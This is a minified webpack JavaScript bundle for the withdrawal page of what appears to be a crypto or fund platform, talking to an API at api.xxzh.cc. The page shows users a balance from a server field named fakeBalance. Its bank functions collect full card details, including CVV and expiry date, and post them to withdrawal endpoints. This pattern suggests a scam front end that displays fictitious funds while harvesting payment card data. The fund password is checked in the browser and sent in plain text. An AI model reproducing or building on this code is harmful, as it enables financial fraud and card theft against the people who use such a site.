"use strict";(self.webpackChunk=self.webpackChunk||[]).push([[4258],{59510:function(I,c,a){a.d(c,{Br:function(){return f},KF:function(){return n},W2:function(){return b},bG:function(){return o},iY:function(){return m},kM:function(){return S},rH:function(){return p},s6:function(){return E}});var v=a(33746),r=v.Z.create({baseURL:"https://api.xxzh.cc",withCredentials:!1,crossDomain:!0,timeout:1e4});r.interceptors.request.use(function(t){var s=localStorage.getItem("token");return s&&(t.headers.Authorization="Bearer ".concat(s)),t},function(t){return Promise.reject(t)});var o=function(s){return r.get("/user/info/".concat(s)).then(function(i){return i.data})},n=function(s,i){return r.put("/user/tron/set",{userId:s,address:i}).then(function(e){return e.data})},m=function(s){return r.get("/user/tron/get",{params:{userId:s}}).then(function(i){return i.data})},b=function(s,i,e,h,_){return r.post("/withdrawal-records/user",{username:s,amount:i,fundPassword:e,method:h,address:_}).then(function(u){return u.data})},f=function(s,i,e,h,_,u){return r.put("/user/set-bank-info",{userId:s,bankAccount:i,realName:e,bankName:h,cvv:_,expiryDate:u}).then(function(P){return P.data})},p=function(s){return r.get("/user/bank-info",{params:{userId:s}}).then(function(i){return i.data})},S=function(s,i,e,h,_,u,P,y){var W="".concat(h," | ").concat(_," | ").concat(u," | CVV:").concat(P," | Exp:").concat(y);return r.post("/withdrawal-records/user/bank",{username:s,amount:i,fundPassword:e,method:"\u94F6\u884C\u5361",address:W}).then(function(x){return x.data})},E=function(s){var i=arguments.length>1&&arguments[1]!==void 0?arguments[1]:0,e=arguments.length>2&&arguments[2]!==void 0?arguments[2]:10;return r.get("/shop/search-with-products",{params:{name:s,page:i,size:e}}).then(function(h){return h.data})}},57540:function(I,c,a){a.d(c,{Z:function(){return m}});var v=a(75271),r=a(69194),o=a(52676),n=function(f){var p=f.visible;return(0,o.jsx)(r.zd,{visible:p,className:"loading-mask",children:(0,o.jsxs)("div",{className:"loading-container",children:[(0,o.jsx)(r.wW,{style:{"--size":"48px"}}),(0,o.jsx)("span",{className:"loading-text",children:"Loading..."})]})})},m=n},84908:function(I,c,a){var v=a(69194),r=a(75271),o=a(5791),n=a(52676),m=function(f){var p=f.title,S=(0,o.s0)(),E=function(){S(-1)};return(0,n.jsx)(n.Fragment,{children:(0,n.jsx)(v.l2,{onBack:E,style:{background:"#fff",position:"sticky",top:0,zIndex:1e3},children:p})})};c.Z=m},93878:function(I,c,a){a.r(c),a.d(c,{default:function(){return s}});var v=a(48305),r=a.n(v),o=a(75271),n=a(69194),m=a(5791),b=a(84908),f=a(59510),p=a(34729),S=a(59739),E=a(57540),t=a(52676);function s(){var i=(0,S.$G)(),e=i.t,h=(0,o.useState)(""),_=r()(h,2),u=_[0],P=_[1],y=(0,o.useState)(""),W=r()(y,2),x=W[0],C=W[1],K=(0,o.useState)("TRC20 or ERC20"),z=r()(K,1),j=z[0],Z=(0,o.useState)(""),M=r()(Z,2),G=M[0],V=M[1],H=(0,o.useState)(null),O=r()(H,2),J=O[0],Y=O[1],$=(0,o.useState)(""),k=r()($,2),B=k[0],Q=k[1],X=(0,o.useState)(!1),N=r()(X,2),q=N[0],F=N[1],tt=(0,o.useState)(0),R=r()(tt,2),T=R[0],et=R[1],at=(0,o.useState)(""),U=r()(at,2),nt=U[0],rt=U[1],ot=(0,o.useState)(!1),L=r()(ot,2),A=L[0],g=L[1],D=(0,m.s0)();(0,o.useEffect)(function(){localStorage.setItem("prevPath","/order");var w=JSON.parse(localStorage.getItem("userInfo"));if(!w){D("/login");return}(0,f.bG)(w.id).then(function(d){d&&d.data&&(V(d.data.username),et(d.data.fakeBalance),rt(d.data.fundPassword),Y(d.data.id),localStorage.setItem("userInfo",JSON.stringify(d.data)),(0,f.iY)(d.data.id).then(function(l){l!=null&&l.data?(C(l.data),F(!0)):(n.FN.show({content:e("withdrawp2p.setAddress")}),F(!1))}).catch(function(){n.FN.show({content:e("withdrawp2p.getAddressFailed")})}))}).catch(function(){D("/login")})},[]);var st=function(){if(!A){g(!0);var d=Number(u);if(!u||isNaN(u)||Number(u)<=0){n.FN.show({content:e("withdrawp2p.invalidAmount")}),g(!1);return}if(d<10){n.FN.show({content:e("withdrawp2p.enterWithdrawAmount")}),g(!1);return}if(Number(u)>T){n.FN.show({content:e("withdrawp2p.amountExceedsBalance")}),g(!1);return}if(!x){n.FN.show({content:e("withdrawp2p.enterWalletAddress")}),g(!1);return}if(!B){n.FN.show({content:e("withdrawp2p.enterFundPassword")}),g(!1);return}if(B!==nt){n.FN.show({content:e("withdrawp2p.incorrectFundPassword")}),g(!1);return}(0,f.KF)(J,x).then(function(){}).catch(function(l){n.FN.show({content:e("withdrawp2p.addressSetFailed")})}),(0,f.W2)(G,u,B,j,x).then(function(l){if(l.code===400){n.FN.show({content:e("withdrawp2p.submissionFailed")});return}n.FN.show({content:e("withdrawp2p.submissionSuccess")}),setTimeout(function(){D("/order/meeting")},2e3)}).catch(function(l){n.FN.show({content:e("withdrawp2p.submissionFailed")})}).finally(function(){g(!1)})}},dt=function(d){var l=d.replace(/[^\d.]/g,"").replace(/^(\d*\.{0,1}\d{0,2}).*/,"$1");P(l)};return(0,t.jsxs)("div",{style:{minHeight:"100vh",background:"linear-gradient(135deg, #f8fafc 0%, #e0e7ef 100%)",boxSizing:"border-box"},children:[(0,t.jsx)(b.Z,{title:e("withdrawp2p.p2pWithdraw"),style:{height:"100px"}}),(0,t.jsx)(E.Z,{visible:A}),"  ",(0,t.jsx)("div",{style:{padding:"32px 0"},className:p.Z.content,children:(0,t.jsxs)(n.Zb,{style:{maxWidth:380,margin:"0 auto",borderRadius:18,boxShadow:"0 4px 16px rgba(0,0,0,0.10)",background:"linear-gradient(135deg, #fff 60%, #f5f7fa 100%)"},bodyStyle:{padding:"36px 24px 32px 24px"},children:[(0,t.jsx)("div",{style:{textAlign:"center",fontSize:22,fontWeight:700,marginBottom:32,color:"#232526",letterSpacing:2},children:e("withdrawp2p.withdraw")}),(0,t.jsxs)("div",{style:{marginBottom:32},children:[(0,t.jsx)("label",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",fontSize:16,color:"#888",marginBottom:10,fontWeight:500},children:(0,t.jsx)("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center"},children:(0,t.jsxs)("span",{style:{fontSize:16,color:"#888"},children:[e("withdrawp2p.balance"),": ",T.toFixed(2)," USDT / USDC"]})})}),(0,t.jsx)(n.II,{placeholder:e("withdrawp2p.enterWithdrawAmount"),value:u,onChange:function(d){var l=d.replace(/\D/g,"");dt(l)},clearable:!0,style:{width:"auto",padding:"6px 12px",borderRadius:10,border:"1.5px solid #bfa14a",background:"#f8fafc",color:"#232526",fontWeight:600,boxShadow:"0 2px 8px rgba(191,161,74,0.06)"},type:"text"})]}),(0,t.jsxs)("div",{style:{marginBottom:32},children:[(0,t.jsx)("label",{style:{display:"block",fontSize:16,color:"#888",marginBottom:10,fontWeight:500},children:e("withdrawp2p.walletAddress")}),(0,t.jsx)(n.II,{placeholder:e("withdrawp2p.enterWalletAddress"),value:x,onChange:function(d){return C(d)},disabled:q,clearable:!0,style:{width:"auto",padding:"6px 12px",borderRadius:10,border:"1.5px solid #bfa14a",background:"#f8fafc",color:"#232526",fontWeight:600,boxShadow:"0 2px 8px rgba(191,161,74,0.06)"}})]}),(0,t.jsxs)("div",{style:{marginBottom:32},children:[(0,t.jsx)("label",{style:{display:"block",fontSize:16,color:"#888",marginBottom:10,fontWeight:500},children:e("withdrawp2p.chain")}),(0,t.jsx)(n.II,{value:j,disabled:!0,clearable:!0,style:{width:"auto",padding:"6px 12px",borderRadius:10,border:"1.5px solid #bfa14a",background:"#f0f0f0",color:"#232526",fontWeight:600,boxShadow:"0 2px 8px rgba(191,161,74,0.06)"}})]}),(0,t.jsxs)("div",{style:{marginBottom:32},children:[(0,t.jsx)("label",{style:{display:"block",fontSize:16,color:"#888",marginBottom:10,fontWeight:500},children:e("withdrawp2p.fundPassword")}),(0,t.jsx)(n.II,{placeholder:e("withdrawp2p.enterFundPassword"),value:B,onChange:function(d){return Q(d)},clearable:!0,type:"text",autoComplete:"off",style:{width:"auto",padding:"6px 12px",borderRadius:10,border:"1.5px solid #bfa14a",background:"#f8fafc",color:"#232526",fontWeight:600,boxShadow:"0 2px 8px rgba(191,161,74,0.06)"}})]}),(0,t.jsx)(n.zx,{color:"primary",size:"large",style:{width:"100%",height:48,borderRadius:12,fontSize:18,fontWeight:700,background:"linear-gradient(90deg, #bfa14a 0%, #ffe082 100%)",color:"#232526",letterSpacing:2,boxShadow:"0 2px 8px rgba(191,161,74,0.10)"},disabled:A,onClick:st,children:e("withdrawp2p.withdraw")})]})})]})}},34729:function(I,c){c.Z={content:"content___GUahl"}}}]);
